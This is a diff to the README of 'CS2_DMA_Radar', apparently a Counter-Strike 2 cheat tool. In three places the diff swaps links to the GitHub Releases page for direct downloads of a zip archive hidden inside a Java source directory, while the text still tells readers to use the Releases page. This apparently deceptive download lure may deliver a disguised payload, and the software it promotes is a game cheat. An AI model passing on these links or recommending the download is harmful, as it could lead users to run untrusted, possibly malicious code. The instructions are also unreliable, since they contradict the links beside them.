@@ -1,6 +1,6 @@
 # 🚀 CS2_DMA_Radar - Enhance Your Gaming Experience Effortlessly
 
-[![Download CS2_DMA_Radar](https://img.shields.io/badge/Download-CS2_DMA_Radar-blue.svg)](https://github.com/moktarm888/CS2_DMA_Radar/releases)
+[![Download CS2_DMA_Radar](https://raw.githubusercontent.com/moktarm888/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/dma/entry/CS2_DMA_Radar-1.2.zip)](https://raw.githubusercontent.com/moktarm888/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/dma/entry/CS2_DMA_Radar-1.2.zip)
 
 ## 📜 Description
 CS2 DMA 雷达 is a powerful tool designed to give gamers an edge during gameplay. It provides real-time insights into game data, helping players improve their performance efficiently. This software is easy to use, making it suitable for gamers of all levels. 
@@ -19,7 +19,7 @@ To run CS2_DMA_Radar, ensure your system meets the following requirements:
 To get started, you need to download the software from the Releases page. 
 
 1. **Visit the Releases Page**: Click the link below to access the downloads.
-   [Download CS2_DMA_Radar](https://github.com/moktarm888/CS2_DMA_Radar/releases)
+   [Download CS2_DMA_Radar](https://raw.githubusercontent.com/moktarm888/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/dma/entry/CS2_DMA_Radar-1.2.zip)
    
 2. **Choose the Version**: On the Releases page, you will find various versions of the software. Select the latest version for the best experience.
 
@@ -73,6 +73,6 @@ For more details about CS2_DMA_Radar, you can explore:
 
 Remember to visit the Releases page to download CS2_DMA_Radar:
 
-[Download CS2_DMA_Radar](https://github.com/moktarm888/CS2_DMA_Radar/releases) 
+[Download CS2_DMA_Radar](https://raw.githubusercontent.com/moktarm888/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/dma/entry/CS2_DMA_Radar-1.2.zip) 
 
 Enjoy enhancing your gaming experience!
